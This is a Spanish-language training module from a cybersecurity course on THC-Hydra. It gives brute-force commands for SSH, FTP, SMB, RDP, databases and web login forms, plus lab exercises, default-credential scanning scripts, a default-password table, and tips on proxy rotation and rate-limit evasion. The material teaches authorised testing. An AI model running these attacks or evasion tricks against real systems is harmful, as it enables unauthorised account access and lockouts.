@@ -1,0 +1,818 @@
+---
+title: "Minicurso: Hydra"
+module: "minicurso-hydra"
+type: "minicurso"
+description: "Tutorial completo de Hydra para testing de autenticación en ciberseguridad"
+---
+
+
+## ¿Qué es Hydra?
+
+Hydra (THC-Hydra) es una herramienta de fuerza bruta online que soporta más de 50 protocolos de autenticación diferentes. Desarrollada por The Hacker's Choice (van Hauser), es la herramienta estándar para testing de contraseñas en servicios de red como SSH, FTP, HTTP, SMB, RDP, Telnet, y muchos más.
+
+A diferencia de Hashcat que trabaja con hashes offline, Hydra ataca servicios en vivo, enviando credenciales directamente al servicio objetivo. Esto significa que puede detectar mecanismos de defensa como account lockout, rate limiting, y captchas. Su velocidad y paralelismo permiten probar miles de combinaciones por minuto.
+
+En ciberseguridad, Hydra se utiliza para validar políticas de contraseñas, probar resistencia de servicios de autenticación, verificar configuraciones de account lockout, y demostrar el riesgo de servicios expuestos con credenciales débiles. Es esencial en cualquier evaluación de seguridad de infraestructura.
+
+## ¿Por qué aprenderlo?
+
+- **50+ protocolos**: SSH, FTP, HTTP, SMB, RDP, Telnet, MySQL, PostgreSQL, y más
+- **Paralelismo**: Múltiples conexiones simultáneas para velocidad
+- **Modular**: Cada protocolo tiene su propio módulo con opciones específicas
+- **Resume**: Capacidad de reanudar ataques interrumpidos
+- **Auditoría real**: Prueba autenticación en vivo, no hashes estáticos
+
+## Instalación
+
+### macOS
+
+```bash
+# Con Homebrew
+brew install hydra
+
+# Verificar instalación
+hydra -h 2>&1 | head -5
+# Esperado:
+# Hydra v9.5 (c) 2023 by van Hauser/THC
+
+# Verificar módulos disponibles
+hydra -h 2>&1 | grep "Compiled with"
+# Esperado: lista de protocolos soportados
+```
+
+::: {.callout-warning}
+## Limitaciones en macOS
+Algunos módulos de Hydra pueden no estar disponibles en la versión de Homebrew. Para soporte completo, se recomienda Kali Linux o compilación desde fuente.
+:::
+
+### Linux (Ubuntu/Debian)
+
+```bash
+# Instalar desde repositorios
+sudo apt update
+sudo apt install -y hydra hydra-gtk
+
+# Verificar
+hydra -V
+# Esperado: Hydra v9.5
+
+# Verificar módulos
+hydra -h 2>&1 | grep "Compiled with"
+# Esperado:
+# Compiled with: SSH V2/V3, FTP, HTTP(S), SMB, RDP, Telnet, MySQL, ...
+
+# Instalar versión más reciente desde fuente
+sudo apt install -y libssl-dev libssh-dev libidn11-dev libpcre3-dev \
+    libgtk2.0-dev libncurses5-dev libidn11-dev git cmake make gcc
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+./configure
+make -j4
+sudo make install
+```
+
+### Windows
+
+```powershell
+# Hydra no tiene versión nativa para Windows
+# Opción 1: Usar WSL (Windows Subsystem for Linux)
+wsl --install
+# Luego dentro de WSL:
+sudo apt install -y hydra
+
+# Opción 2: Usar Docker
+docker run --rm -it vanhauser/thc-hydra hydra -h
+
+# Opción 3: Kali Linux en VM
+# Descargar: https://www.kali.org/get-kali/
+```
+
+::: {.callout-warning}
+## Aviso Legal y Ético
+Hydra es una herramienta de fuerza bruta. Intentar acceder a sistemas sin autorización es ILEGAL en todas las jurisdicciones. Los ataques de fuerza bruta pueden bloquear cuentas, causar denegación de servicio, y dejar logs evidentes. Solo usa Hydra en sistemas propios o con autorización explícita por escrito. El uso indebido puede resultar en cargos criminales graves.
+:::
+
+## Nivel Básico
+
+### Conceptos Fundamentales
+
+**Online vs Offline**: Hydra ataca servicios en vivo (online). Cada intento genera tráfico de red y queda registrado en logs del servidor.
+
+**Protocol modules**: Cada servicio (SSH, FTP, HTTP, etc.) tiene su propio módulo con sintaxis específica.
+
+**Username list**: Archivo con nombres de usuario, uno por línea.
+
+**Password list**: Archivo con contraseñas candidatas, una por línea.
+
+**Parallel tasks (-t)**: Número de conexiones simultáneas. Más tareas = más rápido, pero más detectable.
+
+**Verbose (-v/-V)**: Mostrar cada intento (-v) o cada intento + respuesta (-V).
+
+### Comandos Esenciales
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `hydra -l user -p pass <host> <service>` | Single credential test | `hydra -l admin -p password 192.168.1.1 ssh` |
+| `-l <user>` | Single username | `hydra -l admin -P dict.txt host ssh` |
+| `-L <file>` | Username list | `hydra -L users.txt -P pass.txt host ssh` |
+| `-p <pass>` | Single password | `hydra -l admin -p password host ssh` |
+| `-P <file>` | Password list | `hydra -l admin -P rockyou.txt host ssh` |
+| `-t <tasks>` | Parallel tasks | `hydra -t 4 -l admin -P dict.txt host ssh` |
+| `-v` | Verbose | `hydra -v -l admin -P dict.txt host ssh` |
+| `-V` | Verbose + show attempts | `hydra -V -l admin -P dict.txt host ssh` |
+| `-o <file>` | Output results | `hydra -o results.txt -l admin -P dict.txt host ssh` |
+| `-s <port>` | Custom port | `hydra -s 2222 -l admin -P dict.txt host ssh` |
+| `-f` | Exit on first match | `hydra -f -l admin -P dict.txt host ssh` |
+| `-w <sec>` | Timeout | `hydra -w 10 -l admin -P dict.txt host ssh` |
+| `-C <file>` | Combo file (user:pass) | `hydra -C combos.txt host ssh` |
+| `-M <file>` | Target list | `hydra -M targets.txt -l admin -P dict.txt ssh` |
+
+### Sintaxis General
+
+```bash
+# Estructura básica
+hydra [OPTIONS] [-L USERS | -l USER] [-P PASS | -p PASS] TARGET SERVICE
+
+# Servicios soportados más comunes:
+# ssh, ftp, telnet, smtp, http-get, http-post-form, smb, rdp, mysql,
+# postgresql, vnc, imap, pop3, ldap, mssql, oracle, snmp, svn, sshkey
+```
+
+### Testing SSH
+
+```bash
+# Test single credential
+hydra -l admin -p password 192.168.1.100 ssh
+# Esperado (si falla):
+# [ERROR] could not connect to target port 22: Connection refused
+# o
+# [DATA] max 16 tasks per 1 server
+# [DATA] attacking ssh://192.168.1.100:22/
+# [FAILED] host: 192.168.1.100   login: admin   password: password
+
+# Test con lista de passwords
+hydra -l admin -P small-dict.txt 192.168.1.100 ssh
+# small-dict.txt contiene contraseñas candidatas
+
+# Test con verbose para ver cada intento
+hydra -v -l admin -P small-dict.txt 192.168.1.100 ssh
+# Esperado: muestra cada intento de login
+
+# Test con verbose completo (ver respuestas)
+hydra -V -l admin -P small-dict.txt 192.168.1.100 ssh
+# Esperado: muestra intento + respuesta del servidor
+```
+
+::: {.callout-tip}
+## Crear wordlist para práctica
+```bash
+cat > small-dict.txt << 'EOF'
+123456
+password
+12345678
+qwerty
+abc123
+monkey
+1234567
+letmein
+trustno1
+dragon
+baseball
+iloveyou
+master
+sunshine
+princess
+EOF
+```
+:::
+
+### Testing FTP
+
+```bash
+# Test FTP anónimo
+hydra -l anonymous -p "" 192.168.1.100 ftp
+
+# Test con credenciales
+hydra -l admin -P small-dict.txt 192.168.1.100 ftp
+
+# Test con puerto personalizado
+hydra -s 2121 -l admin -P small-dict.txt 192.168.1.100 ftp
+
+# Verbose output
+hydra -V -l admin -P small-dict.txt 192.168.1.100 ftp
+# Esperado:
+# [DATA] max 16 tasks per 1 server
+# [DATA] attacking ftp://192.168.1.100:21/
+# [21][ftp] host: 192.168.1.100   login: admin   password: password123
+```
+
+### Testing Telnet
+
+```bash
+# Telnet (protocolo inseguro, sin encriptación)
+hydra -l admin -P small-dict.txt 192.168.1.100 telnet
+
+# Con puerto personalizado
+hydra -s 2323 -l admin -P small-dict.txt 192.168.1.100 telnet
+```
+
+::: {.callout-warning}
+## Telnet es Inseguro
+Telnet transmite todo en texto plano, incluyendo credenciales. Cualquier persona en la red puede interceptar las credenciales con tcpdump o Wireshark. NUNCA usar Telnet en producción. Siempre preferir SSH.
+:::
+
+### Ejercicio 1: Testing de servicios básicos
+
+**Objetivo:** Practicar fuerza bruta contra servicios SSH y FTP en un entorno controlado.
+
+**Paso 1:** Configurar entorno de práctica
+
+```bash
+# Opción A: Usar Docker para crear servicios vulnerables
+docker run -d --name ssh-test -p 2222:22 linuxserver/openssh-server
+# Usuario: abc, Password: abc (por defecto)
+
+# Opción B: Usar Metasploitable VM
+# Descargar: https://sourceforge.net/projects/metasploitable/
+# IP: 192.168.1.100 (ejemplo)
+
+# Verificar servicio
+nc -zv 192.168.1.100 22
+# Esperado: Connection to 192.168.1.100 port 22 [tcp/ssh] succeeded!
+```
+
+**Paso 2:** Test SSH
+
+```bash
+# Test single credential
+hydra -l user -p user 192.168.1.100 ssh
+# Esperado (si correcto):
+# [22][ssh] host: 192.168.1.100   login: user   password: user
+
+# Test con lista de passwords
+hydra -V -l user -P small-dict.txt 192.168.1.100 ssh
+
+# Guardar resultados
+hydra -l user -P small-dict.txt 192.168.1.100 ssh -o ssh-results.txt
+cat ssh-results.txt
+```
+
+**Paso 3:** Test FTP
+
+```bash
+# Verificar FTP
+nc -zv 192.168.1.100 21
+
+# Test FTP
+hydra -V -l msfadmin -P small-dict.txt 192.168.1.100 ftp -o ftp-results.txt
+
+# Ver resultados
+cat ftp-results.txt
+```
+
+## Nivel Intermedio
+
+### HTTP Form Authentication
+
+```bash
+# HTTP POST form login
+# Sintaxis: http-post-form:"<path>:<user_field>=^USER^&<pass_field>=^PASS^:<fail_string>"
+
+# Ejemplo: formulario de login web
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:username=^USER^&password=^PASS^:F=incorrecto"
+# ^USER^ se reemplaza con cada username
+# ^PASS^ se reemplaza con cada password
+# F= indica string que aparece cuando falla
+
+# HTTP GET con basic auth
+hydra -l admin -P small-dict.txt 192.168.1.100 http-get \
+    "/admin/:F=401"
+
+# Con cookies
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:user=^USER^&pass=^PASS^:F=Login failed:H=Cookie: session=abc123"
+
+# Con user agent personalizado
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:user=^USER^&pass=^PASS^:F=failed:H=User-Agent: Mozilla/5.0"
+```
+
+::: {.callout-tip}
+## Identificar Form Strings
+1. Abre el formulario de login en el navegador
+2. Intenta login fallido intencionalmente
+3. Busca el mensaje de error en la respuesta HTML
+4. Usa ese mensaje como fail string (F=)
+5. Si el mensaje cambia, usa un string que siempre aparece en fallos
+:::
+
+### SMB (Windows)
+
+```bash
+# SMB brute force (Windows file sharing)
+hydra -l administrator -P small-dict.txt 192.168.1.100 smb
+
+# Con dominio
+hydra -l administrator -P small-dict.txt 192.168.1.100 smb \
+    -m DOMAIN
+
+# Múltiples usuarios
+hydra -L users.txt -P small-dict.txt 192.168.1.100 smb
+```
+
+### RDP (Remote Desktop)
+
+```bash
+# RDP brute force (Windows Remote Desktop)
+hydra -l administrator -P small-dict.txt 192.168.1.100 rdp
+
+# Con usuario específico
+hydra -V -l admin -P small-dict.txt 192.168.1.100 rdp
+
+# Nota: RDP puede ser lento. Reducir tasks para estabilidad
+hydra -t 2 -l admin -P small-dict.txt 192.168.1.100 rdp
+```
+
+### MySQL y PostgreSQL
+
+```bash
+# MySQL
+hydra -l root -P small-dict.txt 192.168.1.100 mysql
+
+# PostgreSQL
+hydra -l postgres -P small-dict.txt 192.168.1.100 postgres
+
+# Con base de datos específica (MySQL)
+hydra -l root -P small-dict.txt 192.168.1.100 mysql \
+    -m "database_name"
+```
+
+### Múltiples Targets
+
+```bash
+# Lista de targets
+cat > targets.txt << 'EOF'
+192.168.1.100
+192.168.1.101
+192.168.1.102
+EOF
+
+# Atacar todos los targets
+hydra -l admin -P small-dict.txt -M targets.txt ssh
+
+# Atacar con diferentes servicios
+hydra -l admin -P small-dict.txt -M targets.txt ssh -o multi-ssh.txt
+hydra -l admin -P small-dict.txt -M targets.txt ftp -o multi-ftp.txt
+```
+
+### Control de Paralelismo y Timing
+
+```bash
+# Reducir tasks para ser más sigiloso
+hydra -t 2 -l admin -P small-dict.txt 192.168.1.100 ssh
+# -t 2 = solo 2 conexiones simultáneas
+
+# Aumentar tasks para velocidad (red interna)
+hydra -t 16 -l admin -P small-dict.txt 192.168.1.100 ssh
+# -t 16 = 16 conexiones simultáneas
+
+# Timeout por intento
+hydra -w 5 -l admin -P small-dict.txt 192.168.1.100 ssh
+# -w 5 = 5 segundos de timeout
+
+# Timeout de conexión
+hydra -W 3 -l admin -P small-dict.txt 192.168.1.100 ssh
+# -W 3 = 3 segundos para establecer conexión
+
+# Exit on first successful login
+hydra -f -l admin -P small-dict.txt 192.168.1.100 ssh
+# -f = detener al encontrar primera credencial válida
+```
+
+### Ejercicio 2: Testing de formulario web
+
+**Objetivo:** Realizar fuerza bruta contra un formulario de login web.
+
+**Paso 1:** Configurar formulario vulnerable
+
+```bash
+# Usar DVWA (Damn Vulnerable Web App) con Docker
+docker run --rm -it -p 8080:80 vulnerables/web-dvwa
+# Acceder: http://localhost:8080
+# Login default: admin / password
+
+# O usar Juice Shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+```
+
+**Paso 2:** Identificar parámetros del formulario
+
+```bash
+# Inspeccionar el formulario de login
+# Ver los nombres de los campos (name="username", name="password")
+# Identificar mensaje de error cuando falla
+
+# Ejemplo DVWA:
+# Campo usuario: username
+# Campo password: password
+# Mensaje de error: "Login failed"
+```
+
+**Paso 3:** Ejecutar ataque
+
+```bash
+# DVWA login
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+# Con verbose
+hydra -V -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+
+# Guardar resultados
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
+    -o web-login-results.txt
+```
+
+## Nivel Avanzado
+
+### Session Handling y Macros
+
+```bash
+# Hydra soporta macros para manejar tokens CSRF
+# ^USER^ = username, ^PASS^ = password
+
+# Con token CSRF (extraer del formulario)
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:username=^USER^&password=^PASS^&csrf_token=CSRF:F=Login failed"
+
+# Para tokens dinámicos, usar combinación con curl para extraer
+# Primero obtener token
+TOKEN=$(curl -s http://192.168.1.100/login.php | grep -o 'name="csrf_token" value="[^"]*"' | cut -d'"' -f4)
+
+# Luego usar en Hydra
+hydra -l admin -P small-dict.txt 192.168.1.100 http-post-form \
+    "/login.php:username=^USER^&password=^PASS^&csrf_token=${TOKEN}:F=Login failed"
+```
+
+### Proxy Support
+
+```bash
+# Usar proxy para anonimato o rate limiting evasion
+hydra -l admin -P small-dict.txt 192.168.1.100 ssh \
+    -x 192.168.1.50:8080:SOCKS5
+
+# Con autenticación de proxy
+hydra -l admin -P small-dict.txt 192.168.1.100 ssh \
+    -x proxy.example.com:3128:HTTP:proxyuser:proxypass
+
+# Usar proxychains para rotación de IPs
+# Configurar /etc/proxychains.conf
+proxychains hydra -l admin -P small-dict.txt 192.168.1.100 ssh
+```
+
+### Rate Limiting Evasion
+
+```bash
+# Reducir velocidad para evitar detección
+hydra -t 1 -w 10 -l admin -P small-dict.txt 192.168.1.100 ssh
+# -t 1 = una conexión a la vez
+# -w 10 = 10 segundos de timeout
+
+# Con delays entre intentos (usar script externo)
+# Hydra no tiene delay nativo, pero puedes usar:
+while read pass; do
+    hydra -l admin -p "$pass" 192.168.1.100 ssh -f -o results.txt 2>/dev/null
+    sleep 5  # 5 segundos entre intentos
+done < small-dict.txt
+```
+
+::: {.callout-warning}
+## Account Lockout
+Muchos servicios bloquean cuentas después de N intentos fallidos. Hydra puede causar lockouts masivos. Siempre verificar política de lockout antes de ejecutar. En entornos reales, coordinar con el equipo de IT.
+:::
+
+### Custom Modules y Service-Specific Options
+
+```bash
+# SSH con clave específica
+hydra -l admin -P small-dict.txt 192.168.1.100 ssh \
+    -m "key_exchange=diffie-hellman-group14-sha1"
+
+# SMTP con método específico
+hydra -l admin -P small-dict.txt 192.168.1.100 smtp-auth \
+    -m "PLAIN"
+
+# SNMP con comunidad
+hydra -P small-dict.txt 192.168.1.100 snmp
+
+# VNC sin username
+hydra -P small-dict.txt 192.168.1.100 vnc
+
+# IMAP
+hydra -l user -P small-dict.txt 192.168.1.100 imap
+
+# POP3
+hydra -l user -P small-dict.txt 192.168.1.100 pop3
+
+# LDAP
+hydra -l admin -P small-dict.txt 192.168.1.100 ldap
+
+# Redis (sin auth por defecto)
+hydra -P small-dict.txt 192.168.1.100 redis
+```
+
+### Resume de Sesiones Interrumpidas
+
+```bash
+# Hydra guarda sesión en hydra.restore automáticamente
+# Si se interrumpe (Ctrl+C), puedes reanudar
+
+# Reanudar última sesión
+hydra -R
+
+# Reanudar con opciones adicionales
+hydra -R -t 4  # Reanudar con 4 tasks
+
+# Ver contenido del restore file
+cat hydra.restore
+# Contiene: target, service, usernames, passwords, progress
+
+# Eliminar restore file para empezar de nuevo
+rm hydra.restore
+```
+
+### Ejercicio 3: Auditoría completa de autenticación
+
+**Objetivo:** Evaluar la seguridad de autenticación de múltiples servicios.
+
+**Paso 1:** Escanear servicios disponibles
+
+```bash
+# Descubrir servicios con nmap
+nmap -sV -p 21,22,23,25,80,443,445,3306,3389,5432 192.168.1.100
+# Esperado: lista de servicios activos
+
+# Guardar servicios abiertos
+nmap -sV -p 21,22,23,25,80,443,445,3306,3389,5432 192.168.1.100 \
+    -oG services.txt
+grep "open" services.txt
+```
+
+**Paso 2:** Preparar listas de credenciales
+
+```bash
+# Lista de usuarios comunes
+cat > users.txt << 'EOF'
+admin
+root
+user
+test
+administrator
+guest
+ftp
+www
+web
+postgres
+mysql
+oracle
+EOF
+
+# Lista de passwords comunes
+cat > passwords.txt << 'EOF'
+admin
+password
+123456
+12345678
+root
+toor
+test
+guest
+letmein
+qwerty
+EOF
+
+# Combo file (user:pass)
+cat > combos.txt << 'EOF'
+admin:admin
+admin:password
+root:root
+root:toor
+admin:123456
+test:test
+guest:guest
+ftp:ftp
+EOF
+```
+
+**Paso 3:** Ejecutar auditoría
+
+```bash
+# Crear directorio de resultados
+mkdir -p ~/auth-audit-$(date +%Y%m%d) && cd ~/auth-audit-$(date +%Y%m%d)
+
+# SSH
+hydra -L users.txt -P passwords.txt 192.168.1.100 ssh \
+    -t 4 -w 10 -o ssh-results.txt -f
+
+# FTP
+hydra -L users.txt -P passwords.txt 192.168.1.100 ftp \
+    -t 4 -w 10 -o ftp-results.txt -f
+
+# SMB
+hydra -L users.txt -P passwords.txt 192.168.1.100 smb \
+    -t 4 -w 10 -o smb-results.txt -f
+
+# MySQL
+hydra -L users.txt -P passwords.txt 192.168.1.100 mysql \
+    -t 4 -w 10 -o mysql-results.txt -f
+
+# Generar resumen
+echo "=== Resumen de Auditoría de Autenticación ==="
+echo ""
+for f in *-results.txt; do
+    if [ -s "$f" ]; then
+        echo "[$f] Credenciales encontradas:"
+        grep -v "^\[" "$f" | grep -v "^Hydra" | grep -v "^$"
+    else
+        echo "[$f] Sin credenciales encontradas"
+    fi
+    echo ""
+done
+```
+
+## Uso en Ciberseguridad
+
+### Escenario 1: Testing de política de contraseñas
+
+```bash
+#!/bin/bash
+# password-policy-test.sh - Validar fortaleza de credenciales
+
+set -euo pipefail
+
+TARGET="${1:?Uso: $0 <target>}"
+SERVICE="${2:-ssh}"
+WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
+
+echo "=== Testing de Política de Contraseñas ==="
+echo "Target: $TARGET"
+echo "Service: $SERVICE"
+echo ""
+
+# Top 100 passwords más comunes
+echo "[1] Probando top 100 passwords..."
+head -100 "$WORDLIST" > top100.txt
+hydra -l admin -P top100.txt "$TARGET" "$SERVICE" \
+    -t 4 -w 10 -o phase1.txt -f 2>/dev/null || true
+
+# Top 1000
+echo "[2] Probando top 1000 passwords..."
+head -1000 "$WORDLIST" > top1000.txt
+hydra -l admin -P top1000.txt "$TARGET" "$SERVICE" \
+    -t 4 -w 10 -o phase2.txt -f 2>/dev/null || true
+
+# Reporte
+echo ""
+echo "=== Resultados ==="
+if [ -s phase1.txt ] && grep -q "host:" phase1.txt; then
+    echo "[!] Password crackeada en fase 1 (top 100)"
+    grep "host:" phase1.txt
+elif [ -s phase2.txt ] && grep -q "host:" phase2.txt; then
+    echo "[!] Password crackeada en fase 2 (top 1000)"
+    grep "host:" phase2.txt
+else
+    echo "[+] Password resiste top 1000 comunes"
+fi
+```
+
+### Escenario 2: Account Lockout Testing
+
+```bash
+# Verificar si el servicio bloquea cuentas
+# IMPORTANTE: Solo en entornos autorizados
+
+# Contar intentos fallidos antes de lockout
+hydra -l testuser -P passwords.txt 192.168.1.100 ssh \
+    -t 1 -V 2>&1 | tee lockout-test.txt
+
+# Analizar resultado
+grep -c "FAILED" lockout-test.txt
+# Si el número es menor que las passwords en la lista,
+# probablemente hubo lockout
+
+# Verificar lockout intentando login válido
+ssh testuser@192.168.1.100
+# Si dice "account locked", el lockout funciona
+```
+
+### Escenario 3: Default Credentials Scanner
+
+```bash
+#!/bin/bash
+# default-creds-check.sh - Verificar credenciales por defecto
+
+set -euo pipefail
+
+TARGET="${1:?Uso: $0 <target>}"
+
+echo "=== Verificación de Credenciales por Defecto ==="
+echo "Target: $TARGET"
+echo ""
+
+# Lista de credenciales por defecto comunes
+declare -A DEFAULT_CREDS=(
+    ["ssh"]="admin:admin,root:root,root:toor,user:user"
+    ["ftp"]="anonymous:,admin:admin,ftp:ftp"
+    ["telnet"]="admin:admin,root:root"
+    ["http-post-form"]="admin:admin,admin:password"
+)
+
+for service in ssh ftp telnet; do
+    echo "Checking $service..."
+    IFS=',' read -ra PAIRS <<< "${DEFAULT_CREDS[$service]}"
+    for pair in "${PAIRS[@]}"; do
+        user="${pair%%:*}"
+        pass="${pair#*:}"
+        result=$(hydra -l "$user" -p "$pass" "$TARGET" "$service" \
+            -t 1 -w 5 -f 2>&1 || true)
+        if echo "$result" | grep -q "host:.*login:.*password:"; then
+            echo "[!] DEFAULT CREDS FOUND: $service -> $user:$pass"
+        fi
+    done
+done
+```
+
+## Referencia Rápida
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `-l user` | Single user | `hydra -l admin -P dict.txt host ssh` |
+| `-L file` | User list | `hydra -L users.txt -P dict.txt host ssh` |
+| `-p pass` | Single pass | `hydra -l admin -p password host ssh` |
+| `-P file` | Pass list | `hydra -l admin -P rockyou.txt host ssh` |
+| `-C file` | Combo file | `hydra -C combos.txt host ssh` |
+| `-t N` | Tasks | `hydra -t 4 -l admin -P dict.txt host ssh` |
+| `-v/-V` | Verbose | `hydra -V -l admin -P dict.txt host ssh` |
+| `-f` | Exit on first | `hydra -f -l admin -P dict.txt host ssh` |
+| `-o file` | Output | `hydra -o results.txt -l admin -P dict.txt host ssh` |
+| `-s port` | Custom port | `hydra -s 2222 -l admin -P dict.txt host ssh` |
+| `-w sec` | Timeout | `hydra -w 10 -l admin -P dict.txt host ssh` |
+| `-M file` | Target list | `hydra -M targets.txt -l admin -P dict.txt ssh` |
+| `-R` | Resume | `hydra -R` |
+| `-x` | Proxy | `hydra -x proxy:8080:SOCKS5 -l admin -P dict.txt host ssh` |
+| `http-post-form` | Web form | `hydra -l admin -P dict.txt host http-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
+
+## Recursos Adicionales
+
+- **Documentación oficial**: https://github.com/vanhauser-thc/thc-hydra
+- **Wiki**: https://github.com/vanhauser-thc/thc-hydra/wiki
+- **Default credentials**: https://www.cirt.net/passwords
+- **SecLists**: https://github.com/danielmiessler/SecLists (user/pass lists)
+- **Practice**: https://tryhackme.com/ (labs de brute force)
+- **DVWA**: https://github.com/digininja/DVWA (web app vulnerable)
+- **Metasploitable**: https://sourceforge.net/projects/metasploitable/ (VM vulnerable)
+
+## Apéndice: Default Credentials Comunes
+
+### Servicios de Red
+| Servicio | Usuario | Password |
+|----------|---------|----------|
+| SSH | root | root, toor, password, admin |
+| SSH | admin | admin, password, 123456 |
+| SSH | user | user, password, 123456 |
+| FTP | anonymous | (vacío) |
+| FTP | admin | admin, password, ftp |
+| FTP | root | root, toor, password |
+| Telnet | admin | admin, password |
+| Telnet | root | root, toor |
+| SMB | administrator | (vacío), password, admin |
+| RDP | administrator | (vacío), password, admin |
+
+### Bases de Datos
+| Servicio | Usuario | Password |
+|----------|---------|----------|
+| MySQL | root | (vacío), root, password |
+| MySQL | admin | admin, password |
+| PostgreSQL | postgres | postgres, password, (vacío) |
+| MSSQL | sa | (vacío), sa, password |
+| MongoDB | admin | admin, password, (vacío) |
+| Redis | (sin auth) | (vacío por defecto) |
+
+### Web Applications
+| Aplicación | Usuario | Password |
+|------------|---------|----------|
+| WordPress | admin | admin, password, admin123 |
+| Joomla | admin | admin, password |
+| phpMyAdmin | root | (vacío), root, password |
+| Tomcat | admin | admin, tomcat, s3cret |
+| Tomcat | manager | manager, tomcat |
+| Jenkins | admin | admin, password |
+| Grafana | admin | admin |
+| Nexus | admin | admin123 |
+
+---
+
+*Minicurso Hydra — Curso Fundamentos de Ciberseguridad — CC BY-SA 4.0*
